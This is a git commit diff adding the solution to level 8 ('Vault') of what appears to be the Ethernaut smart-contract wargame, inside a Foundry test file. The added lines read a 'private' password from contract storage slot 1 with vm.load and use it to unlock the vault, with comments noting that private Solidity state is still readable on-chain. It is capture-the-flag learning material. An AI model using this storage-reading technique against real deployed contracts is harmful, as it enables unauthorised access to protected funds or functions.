1a89f1f6b65ea27490ded4686f00486421edcb27
oba <obatirou@gmail.com>
2023-04-19 18:58:51 +0200

    Level 8 Vault: solution

--- src/test/Vault.t.sol
+++ src/test/Vault.t.sol
@@ -29,6 +29,17 @@ contract VaultTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // password has a visibility set to private
+        // which means not accessible from other contracts
+        // BUT the information is public on the blockchain
+        // see https://docs.soliditylang.org/en/develop/contracts.html#state-variable-visibility
+        // Hence, it possible to retrieve it
+        // By looking at the Vault contract: password is located at slot 1 in storage
+        // vm.load can be used to retrieve storage slot value in Foundry
+
+        bytes32 password = vm.load(address(ethernautVault), bytes32(uint256(1)));
+        ethernautVault.unlock(password);
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
